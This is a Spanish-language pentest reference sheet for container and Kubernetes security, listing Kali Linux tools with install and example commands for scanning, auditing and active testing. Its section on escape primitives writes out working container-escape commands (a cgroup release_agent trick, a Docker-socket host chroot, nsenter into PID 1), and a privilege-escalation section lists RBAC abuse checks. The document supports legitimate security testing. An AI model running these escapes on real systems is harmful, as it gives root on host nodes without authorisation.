# Herramientas Container & Kubernetes Security — CLI Kali Linux

Docker · Kubernetes · runtime security. Auditoría estática + pentest
activo + escape primitives.

---

## 1. Dockerfile Linting

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **hadolint** | `wget https://github.com/hadolint/hadolint/releases/download/v2.12.0/hadolint-Linux-x86_64 -O /usr/local/bin/hadolint && chmod +x /usr/local/bin/hadolint` | `hadolint Dockerfile` |
| **dockerfilelint** | `npm install -g dockerfilelint` | `dockerfilelint Dockerfile` |
| **checkov (Dockerfile)** | `pip install checkov --break-system-packages` | `checkov -f Dockerfile` |
| **dockerfile-utils** | `npm install -g dockerfile-utils` | `dockerfile-utils format Dockerfile` |

---

## 2. Image Scanning (vuln + secrets + misconfig)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **trivy image** | `sudo apt install trivy` | `trivy image --severity HIGH,CRITICAL --format json -o trivy.json registry/image:tag` |
| **trivy (sbom)** | Idem | `trivy image --format cyclonedx -o sbom.json registry/image:tag` |
| **grype** | `curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh \| sh` | `grype docker:registry/image:tag --output json --file grype.json` |
| **syft (SBOM)** | `curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh \| sh` | `syft docker:registry/image:tag -o cyclonedx-json` |
| **snyk container** | `npm install -g snyk` | `snyk container test registry/image:tag --json` |
| **dockle** | `wget https://github.com/goodwithtech/dockle/releases/latest/download/dockle_Linux-64bit.deb && sudo dpkg -i dockle_Linux-64bit.deb` | `dockle --exit-code 1 registry/image:tag` |
| **docker-scout** | docker plugin | `docker scout cves registry/image:tag` |
| **clair** | docker compose | server + REST API |

---

## 3. Layer / Image Inspection

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **dive** | `wget https://github.com/wagoodman/dive/releases/latest/download/dive_<v>_linux_amd64.deb && sudo dpkg -i dive*.deb` | `dive registry/image:tag` (TUI; `--ci` para CLI) |
| **skopeo** | `sudo apt install skopeo` | `skopeo inspect docker://registry/image:tag` |
| **docker history** | docker | `docker history --no-trunc registry/image:tag` |
| **docker save + tar inspect** | docker | `docker save image:tag -o image.tar; tar -xf image.tar -C ./extracted/` |
| **whaler** | `pip install whaler --break-system-packages` | reverse-engineer Dockerfile desde imagen |
| **dedockify** | `git clone https://github.com/G4LB1T/dedockify` | reverse Dockerfile |

---

## 4. K8s Manifest / Helm Static Analysis

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **kube-linter** | `go install golang.stackrox.io/kube-linter/cmd/kube-linter@latest` | `kube-linter lint ./k8s/` |
| **kubesec** | `wget https://github.com/controlplaneio/kubesec/releases/latest/download/kubesec_linux_amd64.tar.gz` | `kubesec scan ./k8s/deployment.yaml` |
| **kubeaudit** | `go install github.com/Shopify/kubeaudit/cmd/kubeaudit@latest` | `kubeaudit all -f ./k8s/deployment.yaml` |
| **checkov (k8s)** | `pip install checkov --break-system-packages` | `checkov -d ./k8s/ --framework kubernetes` |
| **kics** | `wget https://github.com/Checkmarx/kics/releases/latest/download/kics_<v>_linux_x64.tar.gz` | `kics scan -p ./k8s/ -o ./scans/` |
| **datree** | `curl https://get.datree.io \| /bin/bash` | `datree test ./k8s/*.yaml` |
| **kubescape** | `curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh \| /bin/bash` | `kubescape scan framework nsa -v -f json --output kubescape.json` |
| **polaris** | `wget https://github.com/FairwindsOps/polaris/releases/latest/download/polaris_linux_amd64.tar.gz` | `polaris audit --audit-path ./k8s/ --format json` |
| **terrascan (k8s)** | release github | `terrascan scan -i k8s -d ./k8s/` |

---

## 5. Live Cluster Audit (con kubeconfig)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **kube-bench** | `wget https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_<v>_linux_amd64.deb && sudo dpkg -i kube-bench*.deb` | `kube-bench run --targets master,node` (CIS Benchmark) |
| **kubescape (live)** | Idem §4 | `kubescape scan` (scan cluster activo) |
| **popeye** | `wget https://github.com/derailed/popeye/releases/latest/download/popeye_linux_amd64.tar.gz` | `popeye -A --out json --output-file popeye.json` |
| **rakkess** | `kubectl krew install access-matrix` | `kubectl access-matrix` (RBAC matrix) |
| **kubectl-who-can** | `kubectl krew install who-can` | `kubectl who-can create pods` |
| **rbac-tool** | `kubectl krew install rbac-tool` | `kubectl rbac-tool viz --cluster-context <ctx>` |
| **k0sproject/kontrol** | release github | DR del cluster |

---

## 6. Active Pentest del Cluster

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **kube-hunter (remote)** | `pip install kube-hunter --break-system-packages` | `kube-hunter --remote 10.0.0.1` (sin auth) |
| **kube-hunter (pod-mode)** | Idem | `kube-hunter --pod` (desde dentro de un pod) |
| **kube-hunter (active)** | Idem | `kube-hunter --active --remote ...` (intenta exploitation) |
| **peirates** | release github | `peirates` (TUI interactiva, requiere ejecutar dentro de pod comprometido) |
| **kubeletctl** | release github | `kubeletctl scan rce --hosts 10.0.0.0/24` (kubelet sin auth) |
| **kdigger** | release github | `kdigger dig` (info gathering desde pod) |
| **deepce** | `git clone https://github.com/stealthcopter/deepce` | `bash deepce.sh` (Docker enum desde container) |
| **botb** (BreakOutTheBox) | release github | `./botb-amd64-linux` |
| **DEEPCE for Windows** | manual | recon container Windows |

---

## 7. Container Escape Primitives

| Vector | Comando / Técnica |
|---|---|
| **CAP_SYS_ADMIN + mount** | `mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup && mkdir /tmp/cgroup/x && echo 1 > /tmp/cgroup/x/notify_on_release && echo "$host_path" > /tmp/cgroup/release_agent && sh -c 'echo \$\$ > /tmp/cgroup/x/cgroup.procs'` |
| **release_agent (CVE-2022-0492)** | cgroups v1 escape — solo si el container tiene SYS_ADMIN |
| **Docker socket leak** | `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh` |
| **hostPath mount /** | montaje del root del host → chroot inmediato |
| **hostPID + nsenter** | `nsenter -t 1 -m -u -i -n -p -- /bin/sh` |
| **runc CVE-2019-5736** | sobrescribir runc binary → RCE root next exec |
| **Dirty Pipe (CVE-2022-0847)** | si kernel del host vulnerable |
| **OverlayFS (CVE-2023-0386)** | idem |
| **release_agent inside privileged pod** | Pod privilegiado en K8s → mismo cgroup trick = root en nodo |

---

## 8. K8s Privilege Escalation Patterns

| Vector | Comprobación |
|---|---|
| **SA con `create pods` en kube-system** | `kubectl auth can-i create pods -n kube-system` |
| **SA con `pods/exec`** | `kubectl auth can-i create pods/exec` |
| **SA con `get secrets cluster-wide`** | `kubectl auth can-i get secrets --all-namespaces` |
| **`escalate` verb** | `kubectl auth can-i escalate roles` (escalation directa) |
| **Bind cluster-admin role** | `kubectl auth can-i create rolebindings` + create binding cluster-admin |
| **TokenRequest abuse** | `kubectl auth can-i create serviceaccounts/token` |
| **Webhook abuse** | mutating/validating webhook con permisos amplios |

---

## 9. Registry / Pull-Push Recon

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **docker login (test)** | docker | `docker login registry.target.com` |
| **skopeo (any registry)** | Idem | `skopeo list-tags docker://registry/repo` |
| **regctl** | `wget https://github.com/regclient/regclient/releases/latest/download/regctl-linux-amd64 -O /usr/local/bin/regctl` | `regctl tag ls registry/repo` |
| **container-diff** | release google | diff entre dos imágenes |
| **ECR / ACR / GCR enum** | cloud CLI | `aws ecr describe-repositories; az acr repository list -n <reg>; gcloud container images list` |

---

## 10. Runtime Tools (defensive view / awareness)

| Herramienta | Para qué | Comando |
|---|---|---|
| **falco** | Detección runtime (sysdig) — info sobre qué detecta el cliente | `falco --list-events` |
| **tracee** | eBPF tracing — para entender visibility | `tracee --list-events` |
| **sysdig** | Forensics runtime | `sysdig -p "%proc.name %evt.type %fd.name"` |
| **runc list** | Containers activos | `runc list`, `ctr ns ls && ctr -n k8s.io c ls` |
| **nerdctl** | containerd CLI | `nerdctl ps -a` |

---

## Resumen de Disponibilidad

| Estado | Cantidad |
|---|---|
| **Image/Dockerfile tools** | ~15 |
| **K8s manifest scan** | ~10 |
| **Live cluster audit** | ~7 |
| **Active pentest** | ~10 |
| **Escape primitives** | ~10 técnicas |
| **Total** | **~50 herramientas + 10 técnicas** |

---

## Alcance

Container security end-to-end. Overlap controlado con:
- `cloud_security` (cuando K8s corre en cloud managed).
- `code_security_review` (Dockerfile/Helm también son IaC SAST).
- `post_exploitation` (escape de container → root host).
- `lateral_movement` (desde un nodo K8s comprometido al resto del
  cluster / red interna).
